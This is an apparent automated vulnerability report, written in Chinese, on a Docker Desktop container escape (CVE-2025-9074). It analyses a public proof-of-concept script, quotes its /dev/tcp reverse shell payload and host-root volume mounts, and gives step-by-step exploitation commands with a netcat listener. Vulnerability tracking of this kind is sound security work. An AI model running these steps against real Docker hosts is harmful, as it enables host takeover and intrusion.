## CVE-2025-9074 - Docker Desktop 访问控制不当 (Improper Access Control), 本地提权 (Local Privilege Escalation), 容器逃逸 (Container Escape)

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 访问控制不当 (Improper Access Control), 本地提权 (Local Privilege Escalation), 容器逃逸 (Container Escape)

**影响应用:** Docker Desktop

**危害等级:** 高危 (High): 攻击者可利用本地Linux容器访问Docker引擎API，在特定WSL后端配置下挂载主机驱动器，导致容器逃逸并以当前用户权限在宿主机执行特权命令。

**CVSS评分:** 未提供

**影响版本:** 2025年8月修复前的版本

**利用条件:** 需要本地Linux容器的访问权限；Docker Desktop运行在特定WSL后端配置下；本地容器可通过默认Docker子网访问未经验证的Docker引擎API。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 0%

## 详情

POC有效性分析：
提供的POC脚本 `CVE-2025-9074.sh` 是一个功能完整的Shell脚本，旨在利用Docker Desktop中存在的访问控制不当漏洞。该漏洞允许一个本地Linux容器通过默认的Docker子网（例如在WSL后端配置下常见的 `http://192.168.65.7:2375`）访问未经验证的Docker引擎API。脚本通过 `curl` 命令与Docker API进行交互，首先获取一个现有的Docker镜像（例如 `hello-world`），然后构建一个恶意的JSON负载，用于创建一个新容器。这个JSON负载的关键之处在于它指定了两个特殊的卷挂载：`/mnt/host/c:/host_root_win`（针对Windows主机）和 `/:/host_root_nix`（针对Linux主机），这些挂载将宿主机的根文件系统直接映射到恶意容器内部。此外，JSON负载中的 `Cmd` 参数被设置为一个反向Shell命令：`bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1`，当容器启动时，该命令将被执行。脚本随后向Docker API发送请求创建并启动这个恶意容器，从而在攻击者的监听主机上建立一个反向Shell连接。脚本清晰、直接，使用标准的命令行工具（如 `curl`, `bash`, `awk`, `grep`, `tr`），并提供了详细的使用说明和依赖提示，验证了漏洞的有效性和容器逃逸的能力。

利用步骤：
1.  **前置条件**: 攻击者需要已经获得Docker Desktop环境中一个本地Linux容器的访问权限。受害者的Docker Desktop必须运行在描述中提及的“特定WSL后端配置下”，确保本地容器能够通过默认的Docker子网直接访问未经验证的Docker Engine API（例如，通常位于 `192.168.65.7:2375`）。
2.  **准备监听**: 在攻击者控制的远程机器上，启动一个网络监听器以接收反向Shell连接。例如，使用 `netcat` 命令 `nc -lvp [LPORT]` 来监听指定的端口。
3.  **获取POC脚本**: 攻击者将 `CVE-2025-9074.sh` 脚本传输到受感染的本地容器内部，或从其他可访问Docker Engine API的环境中执行。
4.  **执行POC**: 在容器内部或具备访问权限的环境中，执行POC脚本。命令格式为 `sh CVE-2025-9074.sh [Docker_Engine_IP] [Docker_Engine_PORT] [Attacker_LHOST] [Attacker_LPORT]`。例如，如果Docker Engine API位于 `192.168.65.7:2375`，攻击者的监听IP是 `10.10.14.73`，监听端口是 `9002`，则执行 `sh CVE-2025-9074.sh 192.168.65.7 2375 10.10.14.73 9002`。
5.  **反向Shell建立**: 脚本执行后将自动完成以下操作：
    a.  查询Docker Engine，获取一个可用的基础镜像（如 `hello-world:latest`）。
    b.  构建一个包含恶意负载（反向Shell命令）和关键卷挂载（将宿主机根目录映射到容器内）的JSON请求。
    c.  通过 `curl` 向Docker Engine API发送请求，创建并启动恶意容器。
6.  **结果**: 恶意容器启动后，其中包含的反向Shell命令会被执行，并尝试连接到攻击者预设的监听器。连接成功后，攻击者将获得一个以当前Docker Desktop用户权限运行的宿主机Shell，并通过挂载的宿主机根目录访问宿主机文件系统，实现容器逃逸和本地提权。

投毒风险分析：
对提供的POC代码 (`CVE-2025-9074.sh`) 进行全面分析后，其投毒风险被评估为低 (0%)。主要原因如下：
*   **代码透明性**: 脚本代码完全公开且未经过任何形式的混淆，使得其逻辑和执行的每一步都清晰可见。这极大地降低了隐藏恶意行为的可能性。
*   **标准工具链**: 脚本主要依赖于 `curl` 进行HTTP通信，以及 `bash`、`awk`、`grep`、`tr` 等标准的UNIX/Linux命令行工具。这些都是操作系统自带或广泛使用的可信赖工具，脚本本身没有引入任何未知或可疑的外部二进制文件或库。
*   **无外部下载**: 脚本不包含任何从外部或不可信源下载并执行代码的机制，避免了引入潜在的恶意模块。
*   **利用行为明确**: 脚本的核心功能是向目标Docker Engine API发送请求，以创建并启动一个包含反向Shell的容器。这个反向Shell旨在连接到攻击者指定的IP和端口。这种行为是漏洞利用的本质，其目标是受害系统，而非POC代码的运行者。将反向Shell代码视为“投毒”会误解漏洞利用的概念，因为它是实现攻击目标的关键负载。
*   **无副作用**: 脚本自身在执行过程中不会对运行环境（即执行POC的机器）进行任何未经授权的文件修改、数据窃取、凭证记录或持久化安装等恶意行为。它只是一个一次性的、针对远程目标（Docker Engine API）的命令执行工具。
*   **总结**: 鉴于脚本的完全透明性、对标准和可信工具的依赖、缺乏外部恶意引入以及所有行为都直接服务于漏洞利用本身而非对POC使用者进行攻击，该POC代码是安全的，不构成投毒风险。

**项目地址:** 未提供

**漏洞详情:** 未提供
